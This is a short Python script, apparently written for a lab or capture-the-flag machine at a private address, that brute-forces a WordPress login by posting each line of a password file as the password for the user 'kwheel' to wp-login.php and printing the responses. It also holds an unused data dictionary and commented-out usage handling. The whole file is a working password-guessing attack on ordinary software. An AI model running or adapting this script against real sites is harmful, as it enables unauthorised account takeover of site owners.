import sys,requests

url = "http://10.10.14.90/wp-login.php"
file_path = "test.txt"
file_len = len(open(file_path, "r").readlines())
lines = []
with open(file_path, "r", errors='replace') as f:
	for x in range(file_len):
		lines.append(f.readline().strip('\n'))

data = {
"log": "khweel",
"pwd": "test"
}

for line in lines:
    data = {
    "log":"kwheel",
    "pwd": line
    }
    request = requests.post(url, data)
    print(request)


#try:
#    init_help = sys.argv[1]
#    if init_help == "-h" or init_help == "--help" or len(sys.argv) < 6:
#        print("Usage:")
#        print("-U")
#        print("-P")
#        sys.exit()
#    else:
#        print("done")
#        exit()
        #execute(sys.argv)
#except IndexError:
#    raise SystemExit("-h or --help for usage")
